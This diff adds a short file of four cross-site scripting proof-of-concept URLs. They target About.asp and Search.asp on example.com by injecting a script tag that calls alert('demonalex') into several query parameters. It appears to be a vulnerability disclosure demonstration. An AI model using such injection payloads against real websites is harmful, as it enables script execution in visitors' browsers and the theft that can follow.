@@ -1,0 +1,7 @@
+http://www.example.com/About.asp?ShowOriginal=&quot;&gt;&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;&amp;ShowNew=a&amp;ShowChanges=b
+
+http://www.example.com/About.asp?ShowOriginal=Y&amp;ShowNew=&quot;&gt;&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;&amp;ShowChanges=b
+
+http://www.example.com/About.asp?ShowOriginal=Y&amp;ShowNew=a&amp;ShowChanges=&quot;&gt;&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;
+
+http://www.example.com/Search.asp?Search=&lt;/title&gt;&lt;SCRIPT&gt;alert(&quot;demonalex&quot;);&lt;/SCRIPT&gt;&amp;Page=0
